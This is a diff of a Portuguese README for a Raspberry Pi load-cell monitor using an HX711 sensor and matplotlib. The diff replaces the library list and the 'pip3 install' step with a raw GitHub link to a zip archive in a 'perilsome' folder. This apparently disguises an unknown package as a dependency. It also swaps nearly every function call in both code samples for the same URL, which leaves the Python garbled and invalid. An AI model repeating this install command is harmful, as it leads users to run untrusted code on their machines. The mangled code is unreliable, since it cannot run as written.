@@ -7,7 +7,7 @@
 - Python 3
 - Bibliotecas Python:
   
-  - `RPi.GPIO`
+  - `https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip`
   - `hx711`
   - `matplotlib`
 
@@ -26,7 +26,7 @@ Instale as bibliotecas necessárias usando pip:
 
 ```bash
 sudo apt-get install python3-pip
-pip3 install RPi.GPIO hx711 matplotlib
+pip3 install https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip hx711 matplotlib
 ```
 
 ### Passo 3: Conexão do Hardware
@@ -44,7 +44,7 @@ Conecte os pinos do sensor HX711 à Raspberry Pi conforme a tabela abaixo:
 
 ```bash
 import time
-import matplotlib.pyplot as plt
+import https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip as plt
 from hx711 import HX711
 
 # Configurações do HX711 - Sensor
@@ -52,12 +52,12 @@ DT_PIN = 5  # GPIO5
 SCK_PIN = 6  # GPIO6
 
 hx = HX711(DT_PIN, SCK_PIN)
-hx.set_reading_format("MSB", "MSB")
-hx.set_reference_unit(1)  # Defina a unidade de referência de acordo com a calibração
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("MSB", "MSB")
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(1)  # Defina a unidade de referência de acordo com a calibração
 
 # Inicializa a célula de carga
-hx.reset()
-hx.tare()
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
 
 # Vetores para armazenar dados
 times = []
@@ -65,55 +65,55 @@ forces = []
 
 # Duração da coleta de dados (em segundos)
 duration = 60
-start_time = time.time()
+start_time = https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
 
 print("Coletando dados...")
 
-while time.time() - start_time < duration:
+while https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip() - start_time < duration:
     try:
         # Obtém a leitura bruta da célula de carga
-        val = hx.get_weight(5)
-        current_time = time.time() - start_time
+        val = https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(5)
+        current_time = https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip() - start_time
 
         # Armazena os dados
-        times.append(current_time)
-        forces.append(val)
+        https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(current_time)
+        https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(val)
 
         # Exibe a leitura
         print(f"Tempo: {current_time:.2f}s | Força: {val:.2f}g")
 
         # Diminui a frequência de amostragem para 10Hz
-        time.sleep(0.1)
+        https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(0.1)
     except (KeyboardInterrupt, SystemExit):
         break
 
 # Libera os pinos GPIO
-hx.power_down()
-hx.power_up()
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
 
 # Plota os dados
-plt.plot(times, forces, label="Força aplicada")
-plt.xlabel("Tempo (s)")
-plt.ylabel("Força (g)")
-plt.title("Força aplicada ao longo do tempo")
-plt.legend()
-plt.show()
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(times, forces, label="Força aplicada")
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("Tempo (s)")
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("Força (g)")
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("Força aplicada ao longo do tempo")
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
 ```
 
 ### Passo 4: Calibração
-A calibração da célula de carga é um passo essencial para garantir a precisão das leituras. Ajuste a linha hx.set_reference_unit(1) para um valor que corresponda corretamente ao peso conhecido.
+A calibração da célula de carga é um passo essencial para garantir a precisão das leituras. Ajuste a linha https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(1) para um valor que corresponda corretamente ao peso conhecido.
 
 # Versão para Simulação
 
 ```bash
 import time
-import matplotlib.pyplot as plt
+import https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip as plt
 import numpy as np
 
 # Função para simular a leitura do sensor de carga
 def simulate_load_cell_reading(t):
     # Simula uma variação sinusoidal da carga com um pouco de ruído aleatório
-    load = 10 * np.sin(0.1 * t) + np.random.normal(0, 1)
+    load = 10 * https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(0.1 * t) + https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(0, 1)
     return load
 
 # Vetores para armazenar dados
@@ -122,33 +122,33 @@ forces = []
 
 # Duração da coleta de dados (em segundos)
 duration = 60
-start_time = time.time()
+start_time = https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
 
 print("Coletando dados simulados...")
 
-while time.time() - start_time < duration:
+while https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip() - start_time < duration:
     try:
         # Obtém a leitura simulada da célula de carga
-        current_time = time.time() - start_time
+        current_time = https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip() - start_time
         val = simulate_load_cell_reading(current_time)
 
         # Armazena os dados
-        times.append(current_time)
-        forces.append(val)
+        https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(current_time)
+        https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(val)
 
         # Exibe a leitura
         print(f"Tempo: {current_time:.2f}s | Força: {val:.2f}g")
 
         # Diminui a frequência de amostragem para 10Hz
-        time.sleep(0.1)
+        https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(0.1)
     except (KeyboardInterrupt, SystemExit):
         break
 
 # Plota os dados
-plt.plot(times, forces, label="Força aplicada (simulada)")
-plt.xlabel("Tempo (s)")
-plt.ylabel("Força (g)")
-plt.title("Força aplicada ao longo do tempo (simulação)")
-plt.legend()
-plt.show()
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(times, forces, label="Força aplicada (simulada)")
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("Tempo (s)")
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("Força (g)")
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("Força aplicada ao longo do tempo (simulação)")
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
+https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
 ```
